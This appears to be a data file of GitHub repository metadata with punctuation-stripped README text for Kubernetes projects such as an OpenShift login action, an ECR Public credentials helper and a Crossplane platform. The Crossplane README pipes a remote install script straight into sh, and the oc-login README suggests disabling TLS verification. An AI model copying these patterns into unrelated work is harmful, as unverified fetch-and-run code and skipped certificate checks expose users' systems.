ShotaKitazawa,pipecd-operator,kubernetes#kubernetes-operator,pipecd operator Kubernetes Operator of https github com pipe cd pipe checked environment Kubernetes v1 19 1 kind cluster PipeCD v0 9 0 Install Install CRD Custom Controller kubectl apply f https raw githubusercontent com ShotaKitazawa pipecd operator master deploy deploy yaml Sample Usage Run PipeCD ControlPlane Piped Project Environment and Piped already set up kubectl apply f https raw githubusercontent com ShotaKitazawa pipecd operator master config samples secret yaml kubectl apply f https raw githubusercontent com ShotaKitazawa pipecd operator master config samples pipecdv1alpha1minio yaml kubectl apply f https raw githubusercontent com ShotaKitazawa pipecd operator master config samples pipecdv1alpha1mongo yaml kubectl apply f https raw githubusercontent com ShotaKitazawa pipecd operator master config samples pipecdv1alpha1controlplane yaml kubectl apply f https raw githubusercontent com ShotaKitazawa pipecd operator master config samples pipecdv1alpha1environment yaml kubectl apply f https raw githubusercontent com ShotaKitazawa pipecd operator master config samples pipecdv1alpha1piped yaml using kubectl port forward to expose the installed control plane point your web browser to http localhost 8080 kubectl n pipecd port forward svc pipecd 8080,2020-11-12T15:49:02Z,2020-12-19T07:18:00Z,Go,User,1,7,0,1,master,ShotaKitazawa,1,0,0,5,0,0,4
redhat-actions,oc-login,action#cloud#k8s#kubernetes#oc#openshift#redhat,oc login CI Checks workflow https github com redhat actions oc login workflows CI 20Checks badge svg https github com redhat actions oc login actions query workflow 3A 22CI 20Checks 22 oc login workflow https github com redhat actions oc login workflows oc login 20Example badge svg https github com redhat actions oc login actions query workflow 3A 22oc login Example 22 Multiplatform Workflow https github com redhat actions oc login workflows Multiplatform 20Workflow badge svg https github com redhat actions oc login actions query workflow 3A 22Multiplatform Workflow 22 tag badge https img shields io github v tag redhat actions oc login https github com redhat actions oc login tags license badge https img shields io github license redhat actions oc login LICENSE size badge https img shields io github size redhat actions oc login dist index js dist oc login is a GitHub Action to log into an OpenShift cluster and preserve that Kubernetes context for the remainder of the job See the OpenShift Documentation https docs openshift com enterprise 3 0 devguide authentication html for an explanation of a log in using oc which this action wraps Getting Started with the Action or see example example workflow step 1 oc must be installed on the GitHub Action runner you specify Presently the Ubuntu Environments https github com actions virtual environments available environments come with oc 4 6 0 installed If you want a different version of oc or if you are using the Mac or Windows environments use the oc installer https github com redhat actions oc installer action to install oc before running this action See the multiplatform example github workflows multiplatform yml 2 Find your OpenShift Server URL If you have already performed an oc login locally run oc whoami show server Otherwise in the Web Console click your profile name then Copy Login Commmand The server option contains the OpenShift server URL At this time the cluster must be available on the internet so the Action runner can access it 3 Decide how you are going to log into the OpenShift server from the action The recommended approach is to create a functional Service Account and use its token https github com redhat actions oc login wiki Using a Service Account for GitHub Actions The primary advantage of Service Accounts is that by default their tokens do not expire You can also use a personal token If you have already logged in locally use oc whoami show token Otherwise you can retrieve your token from the Web Console using the same steps as in Step 2 Personal tokens generally expire after 12 or 24 hours depending on how your cluster is configured You can also use your personal credentials username and password If both token and credentials are provided the credentials take precedence and the token is ignored 4 Determine how you are going to manage SSL TLS certificate verification If your cluster uses self signed certificates which is the default the GitHub runner will not recognize the certificate and will not allow you to issue HTTPS requests The easiest way to get around this is to set the insecureskiptlsverify input to true You can also obtain the self signed certificate data from a crt file and use the certificateauthoritydata input 5 Store the Server URL and any credentials passwords tokens or certificates in GitHub Secrets Refer to the GitHub documentation https docs github com en free pro team latest actions reference encrypted secrets You can name them anything you like See below for an example 6 Create your workflow Example Workflow Step Refer to action yml action yml for the full list of inputs See the example workflow github workflows example yml See the multiplatform workflow github workflows multiplatform yml for an example which installs oc and kubectl into the runner first yaml steps name Authenticate and set context uses redhat actions oc login v1 env These can be stored in secrets if desired OPENSHIFTUSER my username OPENSHIFTNAMESPACE my namespace with URL to your OpenShift cluster Refer to Step 2 openshiftserverurl secrets OPENSHIFTSERVER Authentication Token Can use username and password instead Refer to Step 3 openshifttoken secrets OPENSHIFTTOKEN Credentials if desired instead of token Username and password override token if they are set openshiftusername env OPENSHIFTUSER openshiftpassword secrets OPENSHIFTPASSWORD Disables SSL cert checking Use this if you don t have the certificate authority data insecureskiptlsverify true This method is more secure if the certificate from Step 4 is available certificateauthoritydata secrets CADATA Optional this sets your Kubernetes context s current namespace after logging in namespace env OPENSHIFTNAMESPACE Other Optional Inputs By default the cluster name is masked since it can be used to derive the server URL Set revealclustername to true to skip masking the cluster name if you wish it to be visible in the workflow logs Result If the oc login step succeeds The Kubernetes config generated by oc will be saved into a file The KUBECONFIG environment variable will be set to that file The rest of the job will have access to the Kubernetes context so you can run any oc or kubectl commands you like Note that if you start another job the new job will use a new container and you will have to run this action again Since the kubeconfig contains secrets it should not be uploaded in an artifact and cannot set as an output from this action Runner OS Support See the multiplatform workflow github workflows multiplatform yml All 3 runner operating systems are supported See the note in Step 1 getting started regarding installing oc into the non Ubuntu runners Contributing Anyone can contribute to this project This project uses a pre commit hook to ensure consistency between the source code and distribution as well as between the source code and action yml This is verified by the CI Checks workflow After cloning this repository install the hooks by running sh cd oc login cp r scripts git hooks git hooks Then run npm ci to install dependencies and you should be ready to develop Changelog See CHANGELOG md CHANGELOG md,2020-11-05T01:08:31Z,2020-12-17T01:56:08Z,TypeScript,Organization,4,7,2,36,main,tetchel#Divyansh42,2,3,4,2,1,0,5
toricls,ecr-public-creds-helper-for-k8s,credentials-helper#ecr-public#eks#kubernetes,Amazon ECR Public credentials helper for Kubernetes Apache License Version 2 0 https img shields io badge license Apache 202 blue style flat square license license https github com toricls ecr public creds helper for k8s blob master LICENSE Amazon ECR Public credentials helper for Kubernetes ecr public creds helper for k8s for short allows pods in your Kubernetes cluster pull public container images from Amazon ECR Public https aws amazon com blogs aws amazon ecr public a new public container registry registries as authenticated users to get the limit upgraded to 10 pulls per second which is 1 for unauthenticated users as described here https docs aws amazon com AmazonECR latest public public service quotas html or unlimited bandwidth as described here https aws amazon com ecr pricing ecr public creds helper for k8s will run in your cluster as a Kubernetes CronJob every 8 hours by default It authenticates against ECR Public and stores the auth token as Kubernetes Secrets within namespaces you specified Each pod even on AWS Fargate will reference that Kubernetes Secret in its namespace by specifying the imagePullSecrets field in PodSpec to reference that Kubernetes Secret You may also want to patch the default service account in each namespace to avoid writing imagePullSecrets in all PodSpecs see comments in the entrypoint sh entrypoint sh file for further details Installation Step 1 Create a namespace for ecr public creds helper for k8s to run as a CronJob in your Kubernetes cluster shell kubectl apply f namespace yaml namespace ecr public creds helper created Step 2 Create a service account to allow ecr public creds helper for k8s to edit Kubernetes secrets shell kubectl apply f serviceaccount yaml serviceaccount sa secrets editor created clusterrole rbac authorization k8s io secrets editor created clusterrolebinding rbac authorization k8s io edit secrets created Step 3 Create an AWS IAM role to allow ecr public creds helper for k8s to authenticate against Amazon ECR Public We use the mechanism called IAM Roles for Service Accounts IRSA https docs aws amazon com eks latest userguide iam roles for service accounts html to map it to the service account which you created in the previous step If you have not enabled IRSA in your Kubernetes cluster yet please follow the IRSA documentation https docs aws amazon com eks latest userguide iam roles for service accounts html and or the blog post https aws amazon com blogs opensource introducing fine grained iam roles service accounts for enabling IRSA for your Kubernetes cluster We re going to use eksctl here to show the step to create and map the IAM role in EKS cluster but you can also use the AWS CLI the AWS management console CloudFormation Terraform or whatever you want to use shell export POLICYARN aws iam create policy policy name AmazonECRPublicAuthOnlyPolicy policy document file iam permission json query Policy Arn output text Make sure you ve created the policy successfully echo POLICYARN arn aws iam YOURAWSACCOUNTID policy AmazonECRPublicAuthOnlyPolicy export EKSCLUSTERNAME eksctl create iamserviceaccount cluster EKSCLUSTERNAME name sa secrets editor namespace ecr public creds helper attach policy arn POLICYARN override existing serviceaccounts approve Step 4 Run ecr public creds helper for k8s in your Kubernetes cluster NOTE The following YAML file cronjob yaml cronjob yaml uses the toricls ecr public creds helper for k8s latest container image by default but you may want to create and use your own image instead of the pre built one You can create your own image by executing docker run t YOURIMAGENAME in the top level of this repository See also Dockerfile Dockerfile shell vim cronjob yaml Modify the value of the TARGETNAMESPACES environment variable in line 26 to choose which namespaces you want to use the auth token kubectl apply f cronjob yaml cronjob batch ecr public creds helper created Step 5 Create an initial auth token manually to use it from your pods without waiting the initial cronjob to be started Note that ecs public creds helper for k8s refreshes the auth token in every 8 hours by default shell kubectl create job initial creds job n ecr public creds helper from cronjob ecr public creds helper job batch initial creds job created Check the pod log to make sure it works as expected export PODNAME kubectl get pods selector job name initial creds job n ecr public creds helper o jsonpath items 0 metadata name echo PODNAME initial creds job r4fbp you ll see something like this kubectl logs PODNAME n ecr public creds helper You ll see the same number of lines as the TARGETNAMESPACES you specified in cronjob yaml here secret ecr public token created secret ecr public token created secret ecr public token created kubectl delete job initial creds job n ecr public creds helper job batch initial creds job deleted Use auth tokens in Pods Now your pod can use the auth token Kubernetes secret created by ecr public creds helper for k8s to pull public container images as an authenticated user from Amazon ECR Public registries See examples pod yaml examples pod yaml to understand how to reference the auth token from your pods like yaml apiVersion v1 kind Pod snip spec snip imagePullSecrets name ecr public token snip Contribution 1 Fork https github com toricls ecr public creds helper for k8s fork https github com toricls ecr public creds helper for k8s fork 1 Create a feature branch 1 Commit your changes 1 Rebase your local changes against the main branch 1 Create a new Pull Request Licence Apache License 2 0 LICENSE Author Tori https github com toricls,2020-12-23T01:36:15Z,2020-12-29T10:32:38Z,Shell,User,2,7,0,4,main,toricls,1,1,1,0,0,0,0
ari-hacks,kubernetes-chaos-sandbox,chaos-engineering#chaos-experiments#chaos-mesh#cncf#crd#gremlin#k8s#kind#kubernetes#kubespray#litmus#litmus-chaos#microservice#openshift#openshift-cluster#operator#rancher#site-reliability-engineering,Kubernetes Chaos Sandbox chaos experiment https res cloudinary com dssijnlrx image upload v1605648997 PRINCIPLESOFCHAOSENGINEERING7whxiqw png https github com ari hacks kubernetes chaos sandbox A sandbox repo of chaos experiment tutorials with Gremlin https www gremlin com kubernetes Litmus Chaos https litmuschaos io and Chaos Mesh https chaos mesh org Local Setup OS MacOs Catalina Kubernetes Docker Desktop https www docker com products docker desktop Resource settings CPUs 6 Memory 6GB Swap 3GB Disk Size 59 6GB Quick Links to Tutorials x Litmus litmus chaos x Gremlin gremlin x Chaos Mesh chaos mesh Quick Link to Kubernetes setup x Rancher Single node cluster litmus chaos rancher README md create a rancher server x Openshift OKD Single node cluster litmus chaos openshift README md create okd cluster with minishift x Kind single node cluster for dev litmus chaos kind README md create kind cluster x Kubesrpay customizable HA cluster gremlin README md create kubespray cluster Additional tutorials x Setting up Prometheus and Grafana monitoring on K8s https github com ari hacks kubernetes monitoring,2020-11-04T02:23:54Z,2020-12-20T17:06:36Z,Ruby,User,2,7,0,50,main,ari-hacks,1,0,0,0,0,0,0
upbound,platform-ref-multi-k8s,,Multi cloud Kubernetes Reference Platform This reference platform Configuration for multi cloud Kubernetes is a starting point to build run and operate your own internal cloud platform and offer a self service console and API to your internal teams It provides platform APIs to provision fully configured Kubernetes clusters across multiple cloud providers such as AWS GCP and Azure Your app teams can use these platform APIs to self service provision their own Kubernetes clusters on demand when they need them all while ensuring the configuration and policy guardrails that you specified are also applied These platform APIs are composed using the following Crossplane providers Crossplane AWS Provider https doc crds dev github com crossplane provider aws Crossplane GCP Provider https doc crds dev github com crossplane provider gcp Crossplane Azure Provider https doc crds dev github com crossplane provider azure App deployments can securely connect to the infrastructure they need using secrets distributed directly to the app namespace Quick Start Platform Ops SRE Run your own internal cloud platform Create a free account in Upbound Cloud 1 Sign up for Upbound Cloud https cloud upbound io register 1 Create an Organization for your teams Create a Platform instance in Upbound Cloud 1 Create a Platform in Upbound Cloud e g dev staging or prod 1 Connect kubectl to your Platform instance Install the Crossplane kubectl extension for convenience console curl sL https raw githubusercontent com crossplane crossplane master install sh sh cp kubectl crossplane usr local bin Install the Platform Configuration console PLATFORMCONFIG registry upbound io upbound platform ref multi k8s v0 0 3 kubectl crossplane install configuration PLATFORMCONFIG kubectl get pkg AWS Set up the AWS credentials and default AWS ProviderConfig console AWSPROFILE default echo e default nawsaccesskeyid aws configure get awsaccesskeyid profile AWSPROFILE nawssecretaccesskey aws configure get awssecretaccesskey profile AWSPROFILE creds conf console kubectl create secret generic aws creds n crossplane system from file key creds conf kubectl apply f examples provider default aws yaml GCP Set up your GCP account keyfile by following the instructions on https crossplane io docs v0 14 getting started install configure html select provider Ensure that the following roles are added to your service account roles compute networkAdmin roles container admin roles iam serviceAccountUser Then create the secret using the given creds json file console kubectl create secret generic gcp creds n crossplane system from file key creds json Create the ProviderConfig ensuring to set the projectID to your specific GCP project console kubectl apply f examples provider default gcp yaml Invite App Teams to you Organization in Upbound Cloud 1 Create a team Workspace in Upbound Cloud named team1 1 Enable self service APIs in each Workspace 1 Invite app team members and grant access to Workspaces in one or more Platforms App Dev Ops Consume the infrastructure you need using kubectl Join your Organization in Upbound Cloud 1 Join your Upbound Cloud https cloud upbound io register Organization 1 Verify access to your team Workspaces Provision a Network fabric in your team Workspace GUI console 1 Browse the available self service APIs XRDs in your team Workspace 1 Provision a Network using the custom generated GUI for your Platform Configuration 1 View status details in your Workspace GUI console Provision a Kubernetes cluster in your team Workspace GUI console 1 Browse the available self service APIs XRDs in your team Workspace 1 Provision a Cluster using the custom generated GUI for your Platform Configuration 1 View status details in your Workspace GUI console Cleanup Uninstall Cleanup Resources There are 2 options to delete resources created through the Workspace GUI From the Workspace GUI using the ellipsis menu in the resource view Using kubectl delete n team1 Verify all underlying resources have been cleanly deleted console kubectl get managed Uninstall Provider Platform Configuration console kubectl delete configurations pkg crossplane io platform ref multi k8s kubectl delete providers pkg crossplane io provider aws kubectl delete providers pkg crossplane io provider gcp kubectl delete providers pkg crossplane io provider azure kubectl delete providers pkg crossplane io provider helm APIs in this Configuration Cluster provision a fully configured Kubernetes cluster in many different clouds definition yaml cluster definition yaml composition aws yaml cluster composition aws yaml includes transitively EKSCluster NodeGroup IAMRole IAMRolePolicyAttachment HelmReleases for Prometheus and other cluster services composition gcp yaml cluster composition gcp yaml includes transitively GKECluster NodePool HelmReleases for Prometheus and other cluster services Network fabric for a Cluster to securely connect the control plane pods and services definition yaml network definition yaml composition aws yaml network composition aws yaml includes VPC Subnet InternetGateway RouteTable SecurityGroup composition gcp yaml network composition gcp yaml includes Network Subnetwork Customize for your Organization Create a Repository called platform ref multi k8s in your Upbound Cloud Organization Set these to match your settings console UPBOUNDORG acme UPBOUNDACCOUNTEMAIL me acme io REPO platform ref multi k8s VERSIONTAG v0 0 3 REGISTRY registry upbound io PLATFORMCONFIG REGISTRY REGISTRY UPBOUNDORG REPO VERSIONTAG Clone the GitHub repo console git clone https github com upbound platform ref multi k8s git cd platform ref multi k8s Login to your container registry console docker login REGISTRY u UPBOUNDACCOUNTEMAIL Build package console kubectl crossplane build configuration name package xpkg ignore examples hack Push package to registry console kubectl crossplane push configuration PLATFORMCONFIG f package xpkg Install package into an Upbound Platform instance console kubectl crossplane install configuration PLATFORMCONFIG The cloud service primitives that can be used in a Composition today are listed in the Crossplane provider docs Crossplane AWS Provider https doc crds dev github com crossplane provider aws Crossplane GCP Provider https doc crds dev github com crossplane provider gcp Crossplane Azure Provider https doc crds dev github com crossplane provider azure To learn more see Configuration Packages https crossplane io docs v0 14 getting started package infrastructure html Learn More If you re interested in building your own reference platform for your company we d love to hear from you and chat You can setup some time with us at info upbound io For Crossplane questions drop by slack crossplane io https slack crossplane io and say hi,2020-11-16T06:41:43Z,2020-12-15T20:35:42Z,n/a,Organization,10,6,7,8,master,jbw976#rbwsam,2,3,3,2,0,0,3
himadriganguly,k8s-jsonpath,automation#cicd#devops#json#jsonpath#k8s#k8s-jsonpath#kubernetes,K8s JsonPath This repo contains sample jsonpath code related to Kubernetes JSONPath Syntax JSONPath Description The root object element The current object element or Child member operator Recursive descendant operator JSONPath borrows this syntax from E4X Wildcard matching all objects elements regardless their names Subscript operator Union operator for alternate names or array indices as a set start end step Array slice operator borrowed from ES4 Python Applies a filter script expression via static evaluation Script expression via static evaluation Index 1 Nodes nodes 2 Pods pods About Us k8s jsonpath is maintained by Himadri Ganguly octocat bird Contributing Please see our CONTRIBUTING md CONTRIBUTING md LICENSE k8s jsonpath is GNU GPL3 licensed See the LICENSE file for details,2020-12-22T04:25:02Z,2020-12-29T06:25:48Z,n/a,User,1,6,3,19,main,himadriganguly,1,0,0,3,0,1,0
wesdu,fastapi-opentracing,,fastapi opentracing fastapi opentracing middleware works with istio install pip install fastapi opentracing example python from fastapi import FastAPI import uvicorn from fastapiopentracing import getopentracingspanheaders from fastapiopentracing middleware import OpenTracingMiddleware app FastAPI app addmiddleware OpenTracingMiddleware app get async def root carrier await getopentracingspanheaders return span carrier if name main uvicorn run app host 0 0 0 0 port 8000,2020-09-28T06:56:37Z,2020-12-18T04:04:11Z,Python,User,2,6,0,1,master,wesdu,1,0,0,1,0,0,0
joellord,handson-k8s,,Hands On Intro To Kubernetes And OpenShift Intro to Kubernetes Prerequisites Docker Minikube Kubectl Nodes Kubernetes runs your workload by placing containers into Pods to run on Nodes A node may be a virtual or physical machine depending on the cluster Each node contains the services necessary to run Pods managed by the control plane Typically you have several nodes in a cluster in a learning or resource limited environment you might have just one kubectl get nodes Pods Pods are the smallest deployable units of computing that you can create and manage in Kubernetes A Pod as in a pod of whales or pea pod is a group of one or more containers with shared storage network resources and a specification for how to run the containers A Pod s contents are always co located and co scheduled and run in a shared context A Pod models an application specific logical host it contains one or more application containers which are relatively tightly coupled In non cloud contexts applications executed on the same physical or virtual machine are analogous to cloud applications executed on the same logical host Create new pod 1 pod yaml kubectl apply f k8s 1 pod yaml kubectl get all kubectl describe pod hello kubectl logs hello kubectl get pods See restarts kubectl delete pod hello kubectl apply f k8s 2 webserver yaml kubectl get all kubectl exec it pod webserver bin bash service nginx status exit kubectl apply f k8s 3 toolbox json kubectl exec it pod toolbox bin bash printenv curl google com curl webserver Log back into web server hostname I log back in toolbox curl ip Deployments Pods by themselves are useless introducing deployments A Deployment provides declarative updates for Pods ReplicaSets You describe a desired state in a Deployment and the Deployment Controller changes the actual state to the desired state at a controlled rate You can define Deployments to create new ReplicaSets or to remove existing Deployments and adopt all their resources with new Deployments kubectl apply f 4 deployment yaml kubectl get all kubectl logs hello 769fc65b75 8r85k kubectl logs f hello 769fc65b75 8r85k kubectl scale deployment hello replicas 3 kubectl get all kubectl get pods kubectl get pods l job say hello kubectl logs hello 769fc65b75 mxn25 kubectl delete pod hello 769fc65b75 mxn25 kubectl get pods l job say hello Real application kubectl apply f k8s 5 front yaml kubectl get all kubectl get all l app handsonk8s How to reach Services Services An abstract way to expose an application running on a set of Pods as a network service With Kubernetes you don t need to modify your application to use an unfamiliar service discovery mechanism Kubernetes gives Pods their own IP addresses and a single DNS name for a set of Pods and can load balance across them kubectl apply f k8s 6 service yaml kubectl exec it pod toolbox bin bash curl localhost curl front other tab kubectl logs f l section front prefix true curl front exit Ingresses An API object that manages external access to the services in a cluster typically HTTP Ingress may provide load balancing SSL termination and name based virtual hosting kubectl apply f k8s 7 ingress yaml curl minikube ip API Deploy the API kubectl apply f k8s 8 backend yaml Test in browser kubectl apply f k8s 9 adv ingress yaml curl minikube ip api Add environment variables kubectl apply f k8s 10 env yaml Add other API Add other API service name handsonk8s crash env var CRASHINGAPIURL Intro to OpenShift,2020-08-19T20:17:22Z,2020-11-13T15:07:54Z,JavaScript,User,1,6,0,4,master,joellord,1,0,0,0,0,0,0
ecliptical,rusoto-sqs-k8s-demo,aws#kubernetes#rusoto#rust,Using Amazon Web Services from Rust based Kubernetes applications using Rusoto and IAM Roles for Service Accounts In order to use Amazon Web Services such as the Simple Queue Service SQS the API client must supply IAM credentials that would authenticate it and help determine whether it is allowed to perform the requested operation on the target resource e g send a message to a queue Rusoto s https github com rusoto rusoto default credentials provider supports the most common use cases such as supplying AWS credentials via environment variables and user s credential files More advanced use cases such as authentication using STS tokens require additional configuration This project delivers a rudimentary Amazon SQS consumer application running in Kubernetes on EKS which polls for receives and logs messages from the configured SQS queue But rather than using static AWS credentials it runs under a Kubernetes service account linked to an IAM role through a time constrained STS token The best part with a little of bit configuration the management of this time constrained periodically refreshed security token is done automatically Pre requisites 1 Rust nightly 2 Push access to a Docker registry you can set one up on GitHub 3 Amazon Web Services account with admin level credentials 4 Access to an Amazon SQS queue in that account the examples refer to a queue named rusoto sqs k8s demo in the ca central 1 region Note In the snippets below you may see references to AWS account 1234567890 This is a placeholder please replace it with your own account number which you can obtain by executing aws sts get caller identity query Account output text Running locally To build and run the application locally using default AWS credentials in your environment which you can override using the usual environment variables bash RUSTLOG info AWSREGION ca central 1 QUEUEURL https sqs ca central 1 amazonaws com 1234567890 rusoto sqs k8s demo cargo run Building for deployment To build your own Docker image for deployment into Kubernetes make sure you have push access to a Docker registry If you set one up on GitHub bash docker build t ecliptical rusoto sqs k8s demo docker tag ecliptical rusoto sqs k8s demo docker pkg github com YOURGITHUBUSERNAME rusoto sqs k8s demo rusoto sqs k8s demo v1 docker push docker pkg github com YOURGITHUBUSERNAME rusoto sqs k8s demo rusoto sqs k8s demo v1 Deploying into EKS Following the instructions in Introducing fine grained IAM roles for service accounts https aws amazon com id blogs opensource introducing fine grained iam roles service accounts you must stand up a Kubernetes cluster in EKS set up the appropriate IAM role and create a Kubernetes service account linked to that role Then you can deploy the application into Kubernetes eksctl Install eksctl https eksctl io to make EKS cluster administration easier On MacOS using Homebrew https brew sh bash brew tap weaveworks tap brew install eksctl EKS cluster Create an EKS cluster named rusoto sqs demo bash eksctl create cluster rusoto sqs demo IAM policy You need a policy that grants access to your SQS queue To create one e g bash aws iam create policy policy name RusotoSQSK8sDemoConsumer policy document Version 2012 10 17 Statement Effect Allow Action sqs DeleteMessage sqs GetQueueUrl sqs ChangeMessageVisibility sqs DeleteMessageBatch sqs ReceiveMessage sqs GetQueueAttributes sqs ChangeMessageVisibilityBatch Resource arn aws sqs 1234567890 OIDC provider Set up an OIDC provider for your EKS cluster bash eksctl utils associate iam oidc provider cluster rusoto sqs demo approve Service account with attached IAM role and policy To create a Kubernetes service account for your pods linked to a dedicated IAM role that has your IAM policy attached to it in one step bash eksctl create iamserviceaccount name rusoto sqs consumer namespace demo cluster rusoto sqs demo attach policy arn arn aws iam 123456789 policy RusotoSQSK8sDemoConsumer approve Kubernetes context Make sure your kubectl has access to your new EKS based Kubernetes cluster bash aws eks update kubeconfig region ca central 1 name rusoto sqs demo kubeconfig kube ecliptical rusoto sqs demo kubeconfig Docker registry secret Your Kubernetes cluster needs to be able to download and install your Docker images from your registry If you set one up on GitHub bash AUTH echo n YOURGITHUBUSERNAME YOURGITHUBAPITOKEN base64 echo auths docker pkg github com auth AUTH kubectl create secret n demo generic regsecret type kubernetes io dockerconfigjson from file dockerconfigjson dev stdin Container secrets For configuration values that you don t want to store in plain text bash kubectl n demo create secret generic rusoto sqs k8s demo secrets from literal queueurl https sqs ca central 1 amazonaws com 1234567890 rusoto sqs k8s demo Create deployment If you re using your own Docker registry then you must update the deployment yaml deployment yaml file and replace the reference to the docker pkg github com ecliptical rusoto sqs k8s demo rusoto sqs k8s demo v1 image with your own Finally to deploy the application bash kubectl apply f deployment yaml Tailing the logs To see if your application works i e no errors and received processed messages are logged bash kubectl n demo logs f l app kubernetes io name rusoto sqs k8s demo timestamp Aug 23 23 57 51 508 level INFO target rusotosqsk8sdemo fields message rusoto sqs k8s demo 0 1 0 4b04653 release build linux x8664 Sun 23 Aug 2020 19 12 11 0000 log target rusotosqsk8sdemo log modulepath rusotosqsk8sdemo log file src main rs log line 189 timestamp Aug 23 23 57 51 488 level INFO target rusotosqsk8sdemo fields message rusoto sqs k8s demo 0 1 0 4b04653 release build linux x8664 Sun 23 Aug 2020 19 12 11 0000 log target rusotosqsk8sdemo log modulepath rusotosqsk8sdemo log file src main rs log line 189 timestamp Aug 23 23 57 51 690 level INFO target rusotosqsk8sdemo fields message rusoto sqs k8s demo 0 1 0 4b04653 release build linux x8664 Sun 23 Aug 2020 19 12 11 0000 log target rusotosqsk8sdemo log modulepath rusotosqsk8sdemo log file src main rs log line 189 Testing it out To send a test message to your SQS queue bash aws sqs send message queue url https sqs ca central 1 amazonaws com 1234567890 rusoto sqs k8s demo message body Hello world In your application logs you should see entries similar to the following json timestamp Aug 23 23 58 09 780 level INFO target rusotosqsk8sdemo fields message Message attributes None body Some Hello world md5ofbody Some 86fb269d190d2c85f6e0468ceca42a20 md5ofmessageattributes None messageattributes None messageid Some d1ec1019 6398 4c75 b320 4a1e653e63ef receipthandle Some AQEBDrxJ fnjddGjP8J6zvFKtw log target rusotosqsk8sdemo log modulepath rusotosqsk8sdemo log file src main rs log line 129,2020-08-23T18:56:56Z,2020-12-08T14:58:03Z,Rust,Organization,2,6,0,3,master,pnehrer,1,0,0,0,0,0,0
LostInBrittany,ovhcloud-k8s-autoscaling-demo,,OVHcloud Ecosystem Experience img ecosystemexperience png OVHcloud Kubernetes auto scaling demo In this repository you will find the documentation and the code accompanying the Auto scaling and load testing your web application on Kubernetes tech master class at the OVHcloud Ecosystem Experience 2020 https ecosystemexperience ovhcloud com Pods In the pods folder you will find the code of the two kinds of pods we are deploying for these demo Both pods are very naive prime numbers calculators but with a very different memory consumption profile The Prime Numbers pods pods primenumbers simply calculates prime numbers in the most performance ineffective way by dividing every positive integer number by all the lower positive integers It s a CPU intensive operation but it use a minimal amount of memory The Memory Grabber pods pods memorygrabber calculates prime numbers with a slightly less naive algorithm more efficient in CPU terms but with a linear growing memory consummation as it stores every prime number found in an array Both are coded in a similar way as NodeJS https nodejs org programs The main script on index js is a Express server https expressjs com that launches a worker thread https nodejs org api workerthreads html were the prime number calculation is done outside the even loop We pack both programs into two Docker images using the official Node Docker image https hub docker com node as a base as described in each Dockerfile We have published the two images on my Dockerhub https hub docker com u lostinbrittany Prime Numbers https hub docker com r lostinbrittany ovhcloud k8s autoscaling demoprime numbers Memory Grabber https hub docker com r lostinbrittany ovhcloud k8s autoscaling demomemory grabber The auto scaler The auto scaler code is in the auto scaler folder As for the prime numbers calculators the autoscaler is a NodeJS https nodejs org program built around Express server https expressjs com The auto scaler uses heavily the Kubernetes API We could have done it using the official NodeJS Kubernetes API client https github com kubernetes client javascript but in order to make the auto scaler as generic as possible we simply call directly the REST API without using the library The code is more complex that for the prime numbers calculators so let s take some time to analyse it Explaining some functions getNodesMetrics This function uses the Kubernetes standard API https kubernetes io docs reference kubernetes api and the Kubernetes Metrics API https kubernetes io docs tasks debug application cluster resource metrics pipeline the metrics api to calculate the real CPU and memory consumptions on every node and compares it to the maximum allocatable CPU and memory Counterintuitively it isn t a good metric to base the auto scaler on as it isn t used by the Kubernetes scheduler that uses the resources requests and limits https kubernetes io docs concepts configuration manage resources containers instead of instantaneous consumption getPods This function get all the pods running in a given namespace and computes its resources requests and limits https kubernetes io docs concepts configuration manage resources containers getPodsFromAllNamespaces This function lists the namespaces https kubernetes io docs concepts overview working with objects namespaces in the Kubernetes cluster and then calls getPods on all of them to get all the pods running in the cluster and their resources getLoadByNode The getPodsByNode function first calls the Kubernetes API to get the allocatable memory and CPU capacity of every node and then calls getPodsFromAllNamespaces to get add the pods running on the cluster and by looking at the nodes where they run compute the total resources requests and limits allocated for every node getNodePools This function calls the OVHcloud NodePool API https docs ovh com gb en kubernetes managing nodes with api to get the relevant information on all the node pools on your cluster getLoadByNodePool The getLoadByNodePool function uses getNodePools and getLoadByNode to compute for every node pool its total allocated resources requests and limits and its allocatable capability getDeployments and getDeployment name These functions call the API to get information on Deployments They are used by the Kubernetes Invaders webapp to get th increaseDeployment name and decreaseDeployment name increaseDeployment name and decreaseDeployment name are used by the Kubernetes Invaders webapp to increase or decrease the number of Prime Numbers or Memory Grabber pods They do it by calling the Kubernetes API and patching the corresponding Deployment object increaseNodePool name and decreaseNodePool name These functions call OVHcloud NodePool API https docs ovh com gb en kubernetes managing nodes with api to increase or decrease the size of a node pool autoscaling This is the heart of the auto scaler and it s quite simple it calls getLoadByNodePool to get the load of every NodePool and then it makes the decision of upscaling or downscaling them As explained in the talk the decision algorithm can be as simple or as complicated as you need We have kept it simple here For the upscaling we look at the global load in the node pool and to the individual load in each node for both CPU and memory If the global load in either CPU or memory if higher than 80 or if all the nodes have at least one of the loads either CPU or memory over 80 meaning that all the nodes are under pressure the auto scaler will ask to add a node to the node pool For the downscaling we look if the global load is in under 50 in both CPU and memory and we keep a minimum of three active nodes in the node pool at every moment prime numbers and memory grabber REST entry points There are three REST entry points for Prime Numbers and three for Memory Grabber app get prime numbers gets all the information on running Prime Numbers pods app put prime numbers adds a new Prime Numbers pod app delete prime numbers deletes a Prime Numbers pod app get memory grabber gets all the information on running Memory Grabber pods app put memory grabber adds a new Memory Grabber pod app delete memory grabber deletes a Memory Grabber pod nodepool name REST entrypoint These 3 entrypoints allows to deal with the node pools directly for easy testing app get nodepool name gets all the information on a node pool app put nodepool name adds a new node to the node pool app delete nodepool name removes a node from the node pool Dockerfile and Docker image As for Prime Numbers and Memory Grabber we have packed the auto scaler into a Docker images using the official Node Docker image https hub docker com node as a base as described in the Dockerfile The image is available on on my Dockerhub https hub docker com u lostinbrittany The Kubernetes objects In the k8s folder you will find the YAML files for the various Kubernetes objects that we use in the demo rbac yaml Here you have the Service Account the Cluster Role and the Cluster Role Binding needed for the RBAC authentication https kubernetes io docs reference access authn authz The auto scaler pod is going to use this Service Account to be able to call the Kubernetes API In the Service Account rules section we detail the API resources that the auto scaler need to be able to manipulate in order to do its work primenumbers yaml and memorygrabber yaml These are the manifests for the Deployments of the two families of pods Prime Numbers and Memory Grabber Both are rather similar the main difference is the resources asked for Prime Numbers resources limits cpu 300m memory 30Mi requests cpu 150m memory 15Mi Memory Grabber resources limits cpu 200m memory 1500Mi requests cpu 100m memory 1000Mi,2020-09-28T09:45:16Z,2020-11-10T15:37:57Z,JavaScript,User,1,6,0,2,master,LostInBrittany,1,0,0,0,0,0,0
